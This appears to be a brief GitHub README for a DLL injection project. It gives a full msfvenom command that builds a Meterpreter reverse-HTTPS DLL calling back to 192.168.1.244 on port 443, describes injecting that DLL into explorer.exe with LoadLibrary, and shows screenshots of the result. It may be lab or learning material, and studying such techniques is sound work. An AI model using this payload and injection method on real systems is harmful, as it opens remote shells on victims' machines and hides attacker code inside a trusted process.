# DLL-injection
Rushed will goback and explain it better
Usually fun with injecting into video games
basic dll injection script 
script will download the following 
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.244 LPORT=443 -f dll -o met.dll       

dll will be injected into explorer.exe using loadlibrary 
![image](https://github.com/user-attachments/assets/5c7334f5-e9f1-4adb-9ec7-87610728c5fc)


you can than use the process explorer to look our injected dll into explorer.exe
![image](https://github.com/user-attachments/assets/5119ee91-002d-4781-90f1-22fbbd175e78)
